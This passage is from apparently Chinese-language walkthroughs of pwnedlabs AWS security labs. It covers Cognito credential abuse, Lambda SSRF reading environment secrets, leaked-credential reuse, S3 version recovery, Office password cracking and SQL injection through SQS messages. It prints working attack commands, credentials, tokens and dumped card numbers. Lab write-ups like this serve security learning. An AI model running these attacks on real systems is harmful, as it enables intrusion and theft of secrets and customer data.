z5UP0PHrJZqBRor8aRPrzGct9kvgVaXczzmLLz2rWhdk-4VwPNNefTHM6miq8vGK1CH7h-1t9JcrxMMMHXVPX3JmnlGkDDSYVuK2Ae4KZuzIMjhcoKuVD_giLxL0JppWdK2ma7FbzLyAVTxomw9s5tYoiNpN0pfo7l5N4mPCEB6w_0Hrb7OXsZeUYJXdua-XSlHIWff8P_J8MMy2BjVuptImYfSBOEV9KUFHtzaTf8SGs9lzCYU6i49zusDoTCoBHVVZJBPjxYoe9TjwjmRhWqQnOnULiB7P7uNCGgTHkYWSMCDgwfMZq83oFc-glOrhgXn1I5lFY7896Gt7ji-NU.Y4vCaDSkKQ5Ugp8PiM2xpQ",
        "IdToken": "eyJraWQiOiJqTWtSTTVsQnJNUzZxZXFJVWVCRVQyRlhHOUUrZjdwbXVLajM2VlVGMStrPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiI2ZjM5MjFkNy1jNjg0LTQwZTYtOTRhMi1iMWYzMDc3ZWJkMTciLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiaXNzIjoiaHR0cHM6XC9cL2NvZ25pdG8taWRwLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tXC91cy1lYXN0LTFfOHJjSzdhYnR6IiwiY29nbml0bzp1c2VybmFtZSI6ImZlbmcxIiwib3JpZ2luX2p0aSI6IjMyNzU4MzY5LTVkZWEtNGUwZC1iOWEyLTk4NWZlOTg1ZDVjNCIsImF1ZCI6IjE2ZjFnOThiZnVqOWkwZzNmOGJlMzZra3JsIiwiZXZlbnRfaWQiOiIxZjIzZjg2ZC1kYTY0LTQ3YzYtOTQ4ZC1iZTkwNzcxMDZkMjciLCJ0b2tlbl91c2UiOiJpZCIsImF1dGhfdGltZSI6MTY5ODA2NDg2MiwiZXhwIjoxNjk4MDY4NDYyLCJpYXQiOjE2OTgwNjQ4NjIsImp0aSI6ImJlNzVjYTcyLWM5YjktNGEwNS05NjU1LTRjODdmNTlkNzY2MCIsImVtYWlsIjoic3VsaXNoaTE0MTU5MjY1M0BnbWFpbC5jb20ifQ.YNgLg2oLKz-rDBoMJMbU1sjDXzPXaJKvRqm9bnG-I7MLaNgBxH0rtwJLhcWoTGcUtGUirqneDHaTchkgCp5Ob6dn8POPNECUUvoM11u8JYh2iXss_RNbnZSTNd7jDs9zdqarIQQaoU4iur3EcOSWD2d7qMj89-6k_fLCoHuhj05oksZ74iAwnqE_s3o9IrIN0SzXKSYjGlcIeMmurrKEKyieNXHdHNZO9_DqFtGV63vS8WOkCh_uDUlmQTIO6b8vVRLMtx9hm-gfpHqSth55qd3upfgrXkKHyM37gX9UoYrc0-h_3vz7Cg8AF5yVLcc0tsd4QiTtKlNk24a95I6rUw"
    }
}


```

后续与身份池交互要用到IdToken：

![image-20231024111641882](pwnedlabs.assets/image-20231024111641882.png)

从jwt可以得到很多信息，其中的iis是后续--logins要用到的`cognito-idp.<region>.amazon-aws.com/<YOUR_USER_POOL_ID>`。

接下来步骤一样的，只不过要拿jwt去重新获取凭证。这次不是匿名获取的凭证，是登录过用户池的身份拿的凭证。

```bash


aws cognito-identity get-id --identity-pool-id us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367 --logins "cognito-idp.us-east-1.amazonaws.com/us-east-1_8rcK7abtz=IdToken" --no-cli-pager
{
    "IdentityId": "us-east-1:3ac15a2c-a3a0-4bec-8474-e224565f45d3"
}


aws cognito-identity get-credentials-for-identity --identity-id us-east-1:06a13cbe-d10c-43f6-bd44-eee7d773c61b --logins "cognito-idp.us-east-1.amazonaws.com/us-east-1_8rcK7abtz=TdToken" --no-cl
i-pager
{
    "IdentityId": "us-east-1:3ac15a2c-a3a0-4bec-8474-e224565f45d3",
    "Credentials": {
        "AccessKeyId": "ASIAWHEOTHRFYWTCJTGR",
        "SecretKey": "07GL5hoiBn+KdN3WRyofRj34gDNX4rkxxNpS0OtZ",
        "SessionToken": "IQoJb3JpZ2luX2VjEAUaCXVzLWVhc3QtMSJHMEUCIQDv2f4v3BiCQJttUWiktJ/1CmYOSAhVcmzzPDJt1ALgeQIgNVOyYuF7Y6IOZGsctVi/xAcu0jhhTtGjdflKV0yZc5sqxAQILhAAGgw0Mjc2NDgzMDIxNTUiDC36uhIMJ8/TfjZZcSqhBBwLMkxEj5isAqXnky+vUZa9MPdKog3YxOy0HhvbTOFUqa5bb9SQKfsfOILWAcYGkts3bxdTZhPEJLzryUZElO0vV3xSF2ns8xrD7syBG4URo9fkUi7+agB+gaaa5sFxFAIhJdCqI9LWndAKMuXUcRt/p2y2bogK/S8CJ9vchCHrXq1wYMtWz5GwZURrVVNlew4cuRRWAeLHXtoduelHWsFEqF7xbnSdRUSj8cWOMYR/2c52o47U9BDiX00JGqz8HRuIUWAHdlXlzadkIMb60pZpZ2Jt91eJ1qkV/vo0etp/1jZ1nzXhHa61ffDfIRhkIdOBYl7lR6QLD7iQkXiQgJT3YUc2UkRi/ZPZ4UIpe7eh+eCjgfBfRlweWkqQ6qNjBaQkp347vcG+scqfqQAOtC4mlHJzrNkU90NSr9uoIK2j5TwRfrbeDYhK49aZ01ZKcwfUUBpV+dy4lqvw32skIFVEfe8t2JHrpsCHGsjXwRiwqqv6RWwoKw2Kjxfm0xjUm4EAq1RAyyLrJ77h6cCSCUlG1ad0xNA4h6jB9PS3HWnJ6ubPI7shOp6loYhYKN7klh8z9KGkKgW3gcWfU0a+OtWU5HZcIldfaXPPyne2rB4LtTh0tSnbockJ31qswowGkDK9laAD8Cb6qAfXeD7j/dr/+Z+Kgr/PjPDOx9Rd+HcpV5yyzQWXrZuwAfGBMij378fGOAB7NqL6oZbdNzVMLCc5MJnb2akGOoUC/G6EvE35u2N/e8b6WoUCyIOAtzAMMgyxvps1S+BLagnhrK4dn0MtfQb6q5nsiUDsRPMbSzbH7wBXdfxFQ3oRN3viglbdzd8vGxiHaoifUbdUeMSt9M/BGwB36oelub2oC1OJ6ib7mtZ3kaJxDShZ1YHfLiF4xo3NniNkPMFu9n9X0r7RN+c2Kr9PoIZ727cfhxedCyozK+P3Bg+2oZfTQCIKlasODeBMn71jHez3d0eB5UsVMXRCrxG5F9+rWoOIf/Kvt377JIcefmB/P2GD/eruV51GJSKiLdlhhyKHI+WO5D8zMbbUTun8WOGr8VFCnRwFWKF3kabUwjqqFXGYqFaTNVj1",
        "Expiration": "2023-10-23T21:56:57+08:00"
    }
}
```



配置好之后看一下身份：



```bash
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AROAWHEOTHRFZ7HQ7Z6QA:CognitoIdentityCredentials",
    "Account": "427648302155",
    "Arn": "arn:aws:sts::427648302155:assumed-role/Cognito_StatusAppAuth_Role/CognitoIdentityCredentials"
}

aws iam list-role-policies --role-name Cognito_StatusAppAuth_Role --no-cli-pager
{
    "PolicyNames": [
        "oneClick_Cognito_StatusAppAuth_Role_1689349464673"
    ]
}

aws iam get-role-policy --role-name Cognito_StatusAppAuth_Role --policy-name oneClick_Cognito_StatusAppAuth_Role_1689349464673 --no-cli-pager
{
    "RoleName": "Cognito_StatusAppAuth_Role",
    "PolicyName": "oneClick_Cognito_StatusAppAuth_Role_1689349464673",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "VisualEditor0",
                "Effect": "Allow",
                "Action": [
                    "cognito-identity:*",
                    "mobileanalytics:PutEvents",
                    "cognito-sync:*"
                ],
                "Resource": "*"
            },
            {
                "Sid": "VisualEditor1",
                "Effect": "Allow",
                "Action": [
                    "s3:GetObject",
                    "iam:GetPolicyVersion",
                    "iam:GetPolicy",
                    "iam:ListAttachedRolePolicies",
                    "s3:ListBucket",
                    "iam:ListRolePolicies",
                    "iam:GetRolePolicy"
                ],
                "Resource": [
                    "arn:aws:s3:::hl-app-images",
                    "arn:aws:s3:::hl-app-images/*",
                    "arn:aws:iam::427648302155:policy/Status",
                    "arn:aws:iam::427648302155:role/Cognito_StatusAppAuth_Role"
                ]
            }
        ]
    }
}

aws iam list-attached-role-policies --role-name Cognito_StatusAppAuth_Role --no-cli-pager
{
    "AttachedPolicies": [
        {
            "PolicyName": "Status",
            "PolicyArn": "arn:aws:iam::427648302155:policy/Status"
        }
    ]
}

aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/Status --no-cli-pager
{
    "Policy": {
        "PolicyName": "Status",
        "PolicyId": "ANPAWHEOTHRF4PPCP4KUA",
        "Arn": "arn:aws:iam::427648302155:policy/Status",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 2,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2023-07-13T21:07:44+00:00",
        "UpdateDate": "2023-07-15T09:43:20+00:00",
        "Tags": []
    }
}

aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/Status --version-id v4 --no-cli-pager
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "lambda:InvokeFunction",
                        "lambda:GetFunction"
                    ],
                    "Resource": "arn:aws:lambda:us-east-1:427648302155:function:huge-logistics-status"
                },
                {
                    "Sid": "VisualEditor1",
                    "Effect": "Allow",
                    "Action": "lambda:ListFunctions",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2023-07-15T09:43:20+00:00"
    }
}

aws lambda list-functions --no-cli-pager
{
    "Functions": [
        {
            "FunctionName": "huge-logistics-status",
            "FunctionArn": "arn:aws:lambda:us-east-1:427648302155:function:huge-logistics-status",
            "Runtime": "python3.10",
            "Role": "arn:aws:iam::427648302155:role/service-role/huge-logistics-status-role-4m4kg3fv",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 775,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2023-07-17T17:21:11.000+0000",
            "CodeSha256": "78BBjKChkzNIwtlGOiI9paXxi/IYSuzv1GUaXBNuqY0=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "287ac428-dfc2-4911-b003-e765795d1a5d",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            }
        },
        {
            "FunctionName": "SecretsManagermysql-rotation",
            "FunctionArn": "arn:aws:lambda:us-east-1:427648302155:function:SecretsManagermysql-rotation",
            "Runtime": "python3.9",
            "Role": "arn:aws:iam::427648302155:role/SecretsManagerRDSMariaDBR-SecretsManagerRDSMariaDB-128H7L75TCDD5",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 893992,
            "Description": "Rotates a Secrets Manager secret for Amazon RDS MariaDB credentials using the alternating users rotation strategy.",
            "Timeout": 30,
            "MemorySize": 128,
            "LastModified": "2023-07-12T18:48:35.825+0000",
            "CodeSha256": "LbavP2POQ9AcuPXX54bNIhLOPpMF7GYd/qmDa3WcIp0=",
            "Version": "$LATEST",
            "Environment": {
                "Variables": {
                    "EXCLUDE_CHARACTERS": "/@\"'\\",
                    "SECRETS_MANAGER_ENDPOINT": "https://secretsmanager.us-east-1.amazonaws.com"
                }
            },
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "108eb366-f627-488e-81c6-25a07003ecc4",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
{
    "Configuration": {
        "FunctionName": "huge-logistics-status",
        "FunctionArn": "arn:aws:lambda:us-east-1:427648302155:function:huge-logistics-status",
        "Runtime": "python3.10",
        "Role": "arn:aws:iam::427648302155:role/service-role/huge-logistics-status-role-4m4kg3fv",
        "Handler": "lambda_function.lambda_handler",
        "CodeSize": 775,
        "Description": "",
        "Timeout": 3,
        "MemorySize": 128,
        "LastModified": "2023-07-17T17:21:11.000+0000",
        "CodeSha256": "78BBjKChkzNIwtlGOiI9paXxi/IYSuzv1GUaXBNuqY0=",
        "Version": "$LATEST",
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "287ac428-dfc2-4911-b003-e765795d1a5d",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip",
        "Architectures": [
            "x86_64"
        ],
        "EphemeralStorage": {
            "Size": 512
        },
        "SnapStart": {
            "ApplyOn": "None",
            "OptimizationStatus": "Off"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            }
        }
    ]
}
```

只可以调用huge-logistics-status函数，查看一下函数的详情：

```bash
aws lambda get-function --function-name huge-logistics-status
    "Code": {
        "RepositoryType": "S3",
        "Location": "xxx"
    }
```

Location中可以下载代码，下载下来：

```python
import os
import json
import urllib.request
from datetime import datetime
import boto3
import uuid

def lambda_handler(event, context):
    s3 = boto3.client('s3')
    bucket_name = 'hl-status-log-bucket'
    
    try:
        target = event.get('target', 'http://huge-logistics.com')

        response = urllib.request.urlopen(target)
        data = response.read()
        return_status = 'Service is available.' if response.getcode() == 200 else 'Service is not available.'
        return {
            'statusCode': response.getcode(),
            'statusMessage': return_status,
            'body': data.decode('utf-8')
        }
    except urllib.error.HTTPError as e:
        return {
            'statusCode': e.code,
            'body': json.dumps({
                'message': 'HTTP error occurred.',
                'details': str(e)
            })
        }
    except Exception as e:
        debug_info = {
            'error_message': str(e),
            'request_time': datetime.utcnow().isoformat(),
            'requested_website': target,
            'event': event,
            'error_id': str(uuid.uuid4()),
        }
        debug_info_json = json.dumps(debug_info)
        
        # Try to upload to S3
        try:
            s3.put_object(Body=debug_info_json, Bucket=bucket_name, Key=f'debug_info_{context.aws_request_id}.json')
        except Exception as s3_e:
            print(f"Failed to upload debug info to S3: {str(s3_e)}")

        return {
            'statusCode': 500,
            'body': json.dumps({
                'message': 'Unexpected error occurred.',
                'debug_info': debug_info
            })
        }

```

如果给了target就进行请求，也就是ssrf了。lambda的SSRF一个很常见的攻击方式是读环境变量`/proc/self/environ`，里面大概率会有aksk。

```bash


#ssrf
aws lambda invoke --function-name huge-logistics-status --payload 'eyJ0YXJnZXQiOiJodHRwczovL3d3dy5iYWlkdS5jb20ifQ=='  output2.txt
```

从中拿到aksk，配置好之后访问代码中提到的hl-status-log-bucket即可得到flag。



**防御：**

从攻击流程中很明显可以发现两点问题：身份池不应该支持未经身份验证的身份获取凭证，以及用户池不应该支持注册。



## 15.Leverage Leaked Credentials for Pwnage

从.env中可以获取到的信息：

```bash
DB_USERNAME=jose
DB_PASSWORD=DevOps0001!

REACT_APP_AWS_ACCESS_KEY_ID=AKIAWHEOTHRFVXYV44WP
REACT_APP_AWS_SECRET_ACCESS_KEY=
REACT_APP_AWS_DEFAULT_REGION=us-east-1
REACT_APP_AWS_BUCKET=react-dev-aws
REACT_APP_AWS_USE_PATH_STYLE_ENDPOINT=false


```

知道了一对用户名和密码以及AK，但是没有sk。

尝试获取到ak对应的account id，尝试用这对用户名密码进行aws console的登录，因为用户名密码很可能重复使用

```bash
aws sts get-access-key-info --access-key-id AKIAWHEOTHRFVXYV44WP

```

aws console登录后查看secretmanager：

![image-20231024115346437](pwnedlabs.assets/image-20231024115346437.png)

可以访问employee-database：

```json
{"username": "reports", "password": "fw=T(HWf5;{d`U.PK)19*lC_qhkJ}iD=", "engine": "mariadb", "host": "employees.cwqkzlyzmm5z.us-east-1.rds.amazonaws.com", "port": 3306, "masterarn": "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-admin-Bs8G8Z", "dbInstanceIdentifier": "employees"}

```

登上mysql就可以拿到flag，里面也有雇员的私人信息：

```bash
mysql -u reports -p -h employees.cwqkzlyzmm5z.us-east-1.rds.amazonaws.com
```

![image-20231024120028950](pwnedlabs.assets/image-20231024120028950.png)

也可以用truffleHog工具

```bash
truffleHog --regex --entropy=False ./aws-react-app
```





## 16.Access Secrets with S3 Bucket Versioning

学习了一下s3的versions。

在存储桶中可以查看到有意思的auth.js，但是没有关键的内容。

看一下head：

```bash
curl -I https://huge-logistics-dashboard.s3.eu-north-1.amazonaws.com/static/js/auth.js
HTTP/1.1 200 OK
x-amz-id-2: AX3q4TbiAEc8XfaNgjGUIbxK3XWB6Zc6fY7ldYO9hL2HUv2byFd/Q2HpUj9mwYUOHhJWnT8ZLfE=
x-amz-request-id: W1F7KZ9VZGQACXNX
Date: Tue, 24 Oct 2023 07:01:49 GMT
Last-Modified: Sat, 12 Aug 2023 20:43:43 GMT
ETag: "c3d04472943ae3d20730c1b81a3194d2"
x-amz-server-side-encryption: AES256
x-amz-version-id: j2hElDSlveHRMaivuWldk8KSrC.vIONW
Accept-Ranges: bytes
Content-Type: application/javascript
Server: AmazonS3
Content-Length: 244
```

发现了x-amz-version-id，这说明这个s3启用了版本控制。

Amazon S3 版本控制是一项可以在 S3 存储桶上启用的功能，以将对象的多个版本（包括所有写入和删除）保留在同一存储桶中。一旦为存储桶启用了版本控制，就无法暂停它，只能永久禁用（并且此时已进行版本控制的对象将保持其版本）。

```bash
#没有成功
aws s3api get-bucket-versioning --bucket huge-logistics-dashboard --region eu-north-1 --no-sign-request --no-cli-pager

#列一下所有object的版本信息，发现了两个有意思的文件
aws s3api list-object-versions --bucket huge-logistics-dashboard --region eu-north-1 --no-sign-request  --no-cli-pager

        {
            "ETag": "\"24f3e7a035c28ef1f75d63a93b980770\"",
            "Size": 24119,
            "StorageClass": "STANDARD",
            "Key": "private/Business Health - Board Meeting (Confidential).xlsx",
            "VersionId": "HPnPmnGr_j6Prhg2K9X2Y.OcXxlO1xm8",
            "IsLatest": false,
            "LastModified": "2023-08-16T19:11:03+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"7b63218cfe1da7f845bfc7ba96c2169f\"",
            "Size": 463,
            "StorageClass": "STANDARD",
            "Key": "static/js/auth.js",
            "VersionId": "qgWpDiIwY05TGdUvTnGJSH49frH_7.yh",
            "IsLatest": false,
            "LastModified": "2023-08-12T19:13:25+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        
#查看auth.js的特定版本
aws s3api get-object --bucket huge-logistics-dashboard --region eu-north-1 --key static/js/auth.js --version-id qgWpDiIwY05TGdUvTnGJSH49frH_7.yh auth.js --no-sign-request
```

在里面发现了邮箱和密码。登录进去之后在profile发现了aksk：

![image-20231024151057929](pwnedlabs.assets/image-20231024151057929.png)

配置好之后查看一下信息，然后读取private下的旧版本的xlsx：

```bash
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDATWVWNKAVEJCVKW2CS",
    "Account": "254859366442",
    "Arn": "arn:aws:iam::254859366442:user/data-user"
}

aws s3api get-object --bucket huge-logistics-dashboard --region eu-north-1 --key "private/Business Health - Board Meeting (Confidential).xlsx" --version-id HPnPmnGr_j6Prhg2K9X2Y.OcXxlO1xm8 1.xlsx
```

从中可以读取到flag。



## 17.Secure S3 with Amazon Macie

主要讲了怎么用Amazon Macie。

Amazon Macie 是一项数据安全服务，该服务使用机器学习和模式匹配来发现敏感数据，提供对数据安全风险的可见性，并实现针对这些风险的自动防护。

为了帮助您管理组织的 Amazon Simple Storage Service (Amazon S3) 数据资产的安全状况，Macie 为您提供了 S3 存储桶清单，并自动评估和监控存储桶的安全性和访问控制。如果 Macie 检测到潜在的数据安全性或隐私问题（例如桶变为可供公共访问），Macie 会生成调查发现，供您查看并在必要时进行补救。

Macie 还自动发现和报告敏感数据，让您更好地了解您的组织在 Amazon S3 中存储的数据。要检测敏感数据，您可以使用 Macie 提供的内置标准和技术、您定义的自定义标准或两者的组合。如果 Macie 在 S3 对象中检测到敏感数据，Macie 会生成一个查找结果，通知您 Macie 发现的敏感数据。

除调查结果外，Macie 还提供统计数据和其他数据，以便深入了解您的 Amazon S3 数据的安全状况以及敏感数据可能存在于您的数据资产中的位置。统计数据和数据可以指导您做出决定，对特定 S3 存储桶和对象进行更深入的调查。您可以使用 Amazon Macie 控制台或 Amazon Macie API 查看和分析调查结果、统计数据和其他数据。你也可以利用 Macie 与亚马逊的整合EventBridge和AWS Security Hub通过使用其他服务、应用程序和系统监控、处理和修复调查结果。



![image-20231024170805019](pwnedlabs.assets/image-20231024170805019.png)

以及命令行的操作。

## 18.Exploit Weak Bucket Policies for Privileged Access

```bash
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDA3NRSK2PTKPMJEJQ7H",
    "Account": "785010840550",
    "Arn": "arn:aws:iam::785010840550:user/test"
}
#查看存储桶的的policy，允许访问backup.xlsx
aws s3api get-bucket-policy --bucket hugelogistics-data --no-cli-pager --output text|python -m json.tool
{
    "Statement": [
        {
            "Action": [
                "s3:GetObject",
                "s3:GetObjectAcl"
            ],
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Resource": [
                "arn:aws:s3:::hugelogistics-data/backup.xlsx",
                "arn:aws:s3:::hugelogistics-data/background.png"
            ],
            "Sid": "PublicReadForAuthenticatedUsersForObject"
        },
        {
            "Action": "s3:GetBucketPolicy",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Resource": "arn:aws:s3:::hugelogistics-data",
            "Sid": "AllowGetBucketPolicy"
        }
    ],
    "Version": "2012-10-17"
}

aws s3api get-object --bucket hugelogistics-data  --key backup.xlsx backup.xlsx
```

把`backup.xlsx`下载下来后，发现要密码，学一下excel密码的破解：

```bash
#得到密码的hash
python3.10 office2john.py ~/github/CTF/AWS/pwnedlabs/challenge18/backup.xlsx >hash.txt
#破解，不同版本的 Microsoft Office 使用不同的加密方法。Office 2007 采用基于 SHA-1 和 AES-128 的加密，而 Office 2010 则升级到使用 AES-128 或 AES-256 的 SHA-512。Office 2013 和更新版本通过默认使用 AES-256 的 SHA-512、在加密过程中添加随机盐以及增加 SHA-512 迭代次数，进一步增强了安全性。这使得在较新版本的 Office 中破解加密密码的计算成本更高且速度更慢。
hashcat  hash.txt /Users/feng/many-ctf/rockyou.txt --force --username

#得到密码summertime
```

打开之后是一堆用户名密码但是都不对，继续扫目录发现了/crm，利用crm系统的用户名密码登录成功后，把发票下来下载得到flag。



## 19.SQS and Lambda SQL Injection





```bash
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDATWVWNKAVC74CPGHYZ",
    "Account": "254859366442",
    "Arn": "arn:aws:iam::254859366442:user/analytics-usr"
}

aws sqs list-queues --no-cli-pager
{
    "QueueUrls": [
        "https://sqs.eu-north-1.amazonaws.com/254859366442/huge-analytics"
    ]
}

aws lambda list-functions --no-cli-pager
{
    "Functions": [
        {
            "FunctionName": "huge-logistics-stock",
            "FunctionArn": "arn:aws:lambda:eu-north-1:254859366442:function:huge-logistics-stock",
            "Runtime": "python3.11",
            "Role": "arn:aws:iam::254859366442:role/service-role/huge-lambda-analytics-role-ewljs6ls",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 104874,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2023-09-20T11:26:12.000+0000",
            "CodeSha256": "FkcaVsjbU9YqnNKIPWBqAu76S9bST/bfljnSuDoU4Y0=",
            "Version": "$LATEST",
            "VpcConfig": {
                "SubnetIds": [],
                "SecurityGroupIds": [],
                "VpcId": ""
            },
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "dcbd95eb-b673-40dc-9bc0-2ce35d1edd0c",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            }
        }
    ]
}

aws sqs receive-message --queue-url https://sqs.eu-north-1.amazonaws.com/254859366442/huge-analytics --message-attribute-names All --no-cli-pager
{
    "Messages": [
        {
            "MessageId": "9edf75bc-2bbd-4213-a89f-01a6c1a92619",
            "ReceiptHandle": "AQEBipUBYwdr7DtfzMznQKH99L92iU5uQNM6WY8WeXbBNEwwPVt3zyEqUMmxLFscWU/usOQQCYPHpHYrgcWWBzA7NiyQMQUGo/g3N3ozFqFhG4buqSZwbBcOEuVnJlgTirEJg80at0pAXZ5IiwEjjHluYGnOlUWeWMrc+uUbn/nCLClZVVeLixXa4ttOiYfFygPo1izbP7VZ+Zd3DIItIePfQqbBjBXYodYH+xxBCVDd92zr83Ia7QkxZFyuR+Lvm457ID9GGPSJqoXSVIl/+B9HOMdKBw31teMATKIS7IgsEawd+iFQFaE5z2t1mBHz8ZlTXg2MqxScbLgi57GxjDzFw06ncs6/teT1ZoSDsEOpzYI7zGMv9tPLofJgfj2XXElwlkZJY7LEMG+ZHUTs6iNxIQ==",
            "MD5OfBody": "2e3745c659cd0aa68643411804faac55",
            "Body": "Adidas shipped package of 110kg"
        }
    ]
}

aws lambda list-functions --no-cli-pager
{
    "Functions": [
        {
            "FunctionName": "huge-logistics-stock",
            "FunctionArn": "arn:aws:lambda:eu-north-1:254859366442:function:huge-logistics-stock",
            "Runtime": "python3.11",
            "Role": "arn:aws:iam::254859366442:role/service-role/huge-lambda-analytics-role-ewljs6ls",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 104874,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2023-09-20T11:26:12.000+0000",
            "CodeSha256": "FkcaVsjbU9YqnNKIPWBqAu76S9bST/bfljnSuDoU4Y0=",
            "Version": "$LATEST",
            "VpcConfig": {
                "SubnetIds": [],
                "SecurityGroupIds": [],
                "VpcId": ""
            },
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "dcbd95eb-b673-40dc-9bc0-2ce35d1edd0c",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            }
        }
    ]
}


```

调用函数的时候需要参数，然后爆破参数发现是DESC。

接下来就是奇怪的尝试，我觉得很难联想到，尝试发消息：

```bash
aws sqs send-message --queue-url https://sqs.eu-north-1.amazonaws.com/254859366442/huge-analytics --message-attributes '{ "Weight": { "StringValue": "1337", "DataType":"Number"}, "Client": {"StringValue":"EY", "DataType": "String"}, "trackingID": {"StringValue":"HLT1337", "DataType":"String"}}' --message-body "feng"
#然后调用
aws lambda invoke --function-name huge-logistics-stock --payload 'eyJERVNDIjoiSExUMTMzNyJ9' output
```

发现可以成功查询到HLT1337的相关信息。

然后就是开始测试，最后发现注入点在Client。





```bash
aws sqs send-message --queue-url https://sqs.eu-north-1.amazonaws.com/254859366442/huge-analytics --message-attributes '{ "Weight": { "StringValue": "1337", "DataType":"Number"}, "Client": {"StringValue":"EY\" union select 1,clientName,address,cardUsed from customerData-- -", "DataType": "String"}, "trackingID": {"StringValue":"HLT1337", "DataType":"String"}}' --message-body "feng"

aws lambda invoke --function-name huge-logistics-stock --payload 'eyJERVNDIjoiSExUMTMzNyJ9' output

cat output
[{"trackingID": "HLT1300", "clientName": "EY", "packageWeight": "93", "delivered": "1"}, {"trackingID": "1", "clientName": "Adidas", "packageWeight": "56 Claremont Court", "delivered": "5133110655169130"}, {"trackingID": "1", "clientName": "EY", "packageWeight": "3 Farmco Parkway", "delivered": "4913444258211042"}, {"trackingID": "1", "clientName": "Google Inc.", "packageWeight": "559 Ohio Lane", "delivered": "3532085972424818"}, {"trackingID": "1", "clientName": "VELUS CORP.", "packageWeight": "e46fbfe64cf7e50be097005f2de8b227", "delivered": "3558615975963377"}]
```



所以目标的工作流程大概是这样：

1. 用户（或另一个系统组件）通过SQS消息发送数据（称为“有效负载”）。
2. 该消息暂时存储在SQS队列中，等待处理。
3. Lambda 函数按计划或由其他事件触发，从 SQS 队列中读取此消息进行处理。
4. 作为此处理的一部分，来自 SQS 消息的数据用于与数据库交互，可能作为 SQL 查询的一部分。



即lambda每次从sqs队列中取出一个消息，如果该消息的trackingID是查询的ID，就会将消息的client作为查询语句中的where与数据库交互，将查询到的数据作为lambda的结果。



所以攻击流程不难，但是这种奇怪的工作流程很难想到。



## 20.Azure Blob Container to Initial Acc







## 参考

